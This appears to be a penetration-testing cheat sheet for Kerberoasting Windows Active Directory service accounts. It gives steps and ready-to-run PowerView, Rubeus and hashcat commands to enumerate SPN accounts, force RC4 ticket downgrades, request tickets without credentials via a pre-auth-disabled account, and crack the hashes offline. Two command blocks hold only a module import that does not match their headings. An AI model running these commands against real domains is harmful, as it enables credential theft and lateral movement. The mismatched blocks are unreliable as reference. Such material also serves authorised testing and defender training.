# 09.08 Kerberoasting Windows

> Roast SPN-bearing accounts with `Rubeus kerberoast /tgtdeleg` to force RC4 downgrade; `/nopreauth` skips authentication entirely.

## Overview

Kerberoasting requests TGS tickets for SPN-bearing user accounts and cracks the service-account password offline. PowerView's Get-DomainUser -SPN lists targets; Invoke-Kerberoast retrieves hashes directly. Rubeus kerberoast is faster and supports /tgtdeleg to force RC4 downgrade from AES accounts. When no valid credentials exist, /nopreauth abuses a pre-auth-disabled account to request TGS tickets without authenticating.

## Steps

- Enumerate SPNs with PowerView Get-DomainUser -SPN or Get-DomainSPNTicket.
- Use Invoke-Kerberoast or Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat for a one-liner with CSV output.
- Use Rubeus kerberoast /nowrap to roast all accounts; add /outfile to write hashes to disk.
- Use /tgtdeleg to force RC4 tickets from AES-enabled accounts where backward compat allows.
- If unauthenticated, first run Rubeus createnetonly to get a blank logon session, then use /nopreauth with a pre-auth-disabled username and target SPN.
- Crack with hashcat -m 13100 (Kerberos 5, etype 23, TGS-REP).

## Commands

### PowerView export Kerberoastable hashes

```powershell
Import-Module .\PowerView.ps1
```

### Invoke-Kerberoast

```powershell
Import-Module .\PowerView.ps1
```

### Rubeus kerberoast all accounts

```powershell
Rubeus.exe kerberoast /nowrap
```

### Rubeus kerberoast without credentials (nopreauth)

```powershell
Rubeus.exe kerberoast /nopreauth:amber.smith /domain:<DOMAIN>.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```

### Create sacrificial process (blank logon session)

```powershell
Rubeus.exe createnetonly /program:cmd.exe /show
```

### hashcat crack TGS

```bash
hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
```
